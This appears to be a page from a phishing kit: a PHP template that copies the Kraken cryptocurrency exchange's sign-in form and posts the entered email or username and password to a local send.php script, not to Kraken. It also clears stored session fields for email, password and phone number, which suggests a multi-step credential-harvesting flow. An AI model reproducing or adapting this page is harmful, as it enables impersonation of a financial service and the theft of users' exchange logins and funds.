<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
        $title = 'Sign in to kraken | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="mt55">
            <form method="post" action="<?= base_url('send.php')?>" class="col-12 shadow-sm px20 py17 rounded-4 bg-white">
                <h2 class="fs30 mb25">Sign in to Kraken</h2>
                <div class="my15">
                    <label for="" class="form-label fw-normal">Email or username</label>
                    <input name="email" type="text" maxlength="100" required="" class="form-control form-control-lg" placeholder="" value="" >
                </div>
                <div class="mt15">
                    <label for="" class="form-label fw-normal">Password</label>
                    <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control form-control-lg" placeholder="" value="" >
                </div>
                <div class="mt10 mb30">
                     <a href="#" class="text-secondary text-decoration-none fw-medium fs14">
                        Forgot <span class="text-primary-2">password</span> or <span class="text-primary-2">username</span> ?
                    </a>
                </div>
                <div class="text-center mx-auto d-grid gap-2">
                    <button type="submit" class="btn btn-success btn-lg btn-primary-3 border-0 rounded-pill fs16 fw-medium btn-block rounded-0">Continue</button>
                </div>
                <div class="text-center my25 fw-medium">
                    <span class="text-secondary">Need help?</span>
                    <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none text-primary-2"> Contact Support</a>
                </div>
            </form>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>